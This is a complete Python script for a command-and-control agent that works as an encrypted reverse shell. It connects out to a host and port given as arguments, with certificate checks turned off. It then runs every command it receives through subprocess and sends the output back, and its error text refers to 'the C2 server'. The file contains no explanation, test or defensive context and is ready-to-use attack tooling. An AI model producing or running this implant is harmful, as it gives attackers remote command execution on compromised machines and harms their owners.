import socket
import ssl
import subprocess
import sys

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 9999

def agent(host, port):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((host, port))
        ssl_client = context.wrap_socket(client, server_hostname=host)
        while True:
            command = ssl_client.recv(1024).decode().strip()
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            ssl_client.sendall(output.encode('utf-8') + b"\n")
    except ConnectionRefusedError:
        print("Connection refused. Make sure the C2 server is running.")
    except Exception as e:
        print("An error occurred:", e)
    finally:
        client.close()

def main():
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    else:
        host = DEFAULT_HOST
        port = DEFAULT_PORT

    agent(host, port)

if __name__ == "__main__":
    main()
